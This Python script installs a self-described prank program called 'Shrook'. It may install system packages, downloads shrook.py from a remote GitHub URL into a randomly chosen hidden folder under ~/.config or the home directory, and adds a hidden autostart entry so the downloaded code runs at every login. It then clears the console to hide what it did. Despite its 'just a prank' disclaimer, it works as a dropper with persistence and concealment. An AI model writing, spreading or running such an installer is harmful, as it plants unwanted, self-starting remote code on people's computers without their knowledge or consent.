# ! WARNING: This file installs a program that could be considered malicious.
# DISCLAIMER: This code is purely for fun and does not mean any harm. Its literally just a prank.
import os
import subprocess
import random
import sys
import time
import urllib.error
from pathlib import Path
from urllib.request import urlopen

DESKTOP_ENTRY = """[Desktop Entry]
Type=Application
Exec={executable} {script}
Hidden=true
Terminal=False
Encoding="UTF-8"
Name=Shrook
Comment=Shrook"""

INSTALL_DEPS = {
    "apt": ["python3", "python3-pip"],
    "pacman": ["python", "python-pip"],
}
PIP_DEPENDENCIES = [["pip", "setuptools", "wheel"], ["psutil"]]


def random_directory(path: Path) -> Path:
    candidates = []
    for _obj in path.iterdir():
        if _obj.is_dir():
            candidates.append(_obj)
    if not candidates:
        return path / "pulse"
    return random.choice(candidates)


def download_file(to: Path, executable: Path):
    print("Downloading shrook.py...", end=" ")
    with urlopen("https://raw.githubusercontent.com/EEKIM10/shrook/master/shrook.py") as response:
        print("Connected...", end=" ")
        with to.open("wb") as f:
            print("Reading content...", end=" ")
            f.write(response.read().replace("%__PYTHON__EXECUTABLE__PATH__%", str(executable.absolute())))
            print("Writing file...", end=" ")
    print("Done.")


def main():
    print("Checking dependencies...")
    if os.name == "nt":
        print("Windows interpreter support checking is not implemented. Assuming python and python-pip are installed.")
    else:
        try:
            subprocess.run((sys.executable, "-m", "pip", "--version"), check=True)
        except (FileNotFoundError, subprocess.CalledProcessError):
            print("Python 3 (or pip) is not installed. Installing...")
            if Path("/bin/apt").exists():
                cmd = ["apt", "install", "-y"] + INSTALL_DEPS["apt"]
            elif Path("/bin/pacman").exists():
                cmd = ["pacman", "-S", "--noconfirm"] + INSTALL_DEPS["pacman"]
            else:
                raise RuntimeError("Unsupported package manager. Please install python3 and python3-pip manually.")
            subprocess.run(cmd, check=True)

    print("Finding random path in users home directory")
    if os.name == "nt":
        home = random_directory(Path.home())
    else:
        home = Path.home() / ".config"

    if "--dry" in sys.argv:
        import tempfile
        home = Path(tempfile.gettempdir()).absolute()

    directory = random_directory(home).expanduser().absolute()
    directory.mkdir(parents=True, exist_ok=True)
    print(f"Using {directory} as installation directory")
    print("Creating virtual environment...")
    subprocess.run((sys.executable, "-m", "venv", directory / "venv"), check=True)
    scripts = "bin" if os.name != "nt" else "Scripts"
    print("Installing dependencies over pip (batch 1/2)...")
    subprocess.run((directory / "venv" / scripts / "python", "-m", "pip", "install", *PIP_DEPENDENCIES[0]), check=True)
    print("Installing dependencies over pip (batch 2/2)...")
    subprocess.run((directory / "venv" / scripts / "python", "-m", "pip", "install", *PIP_DEPENDENCIES[1]), check=True)
    try:
        download_file(directory / "shrook.py", directory / "venv" / scripts)
    except urllib.error.HTTPError as e:
        print(f"Failed to download shrook.py. Error: {e}")
        return

    if Path("~/.config/autostart").expanduser().exists():
        print("Creating autostart file...")
        with (Path("~/.config/autostart/shrook.desktop").expanduser().open("w")) as f:
            f.write(DESKTOP_ENTRY.format(executable=directory / "venv" / scripts / "python", script=directory / "shrook.py"))
    else:
        print("Autostart directory not found. Skipping autostart file creation.")

    print("Installation complete. Enjoy!")
    print("Clearing console output in 3 seconds", end="")
    for _ in range(3):
        print(".", end="")
        sys.stdout.flush()
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break
    os.system("cls" if os.name == "nt" else "clear")


if __name__ == '__main__':
    main()
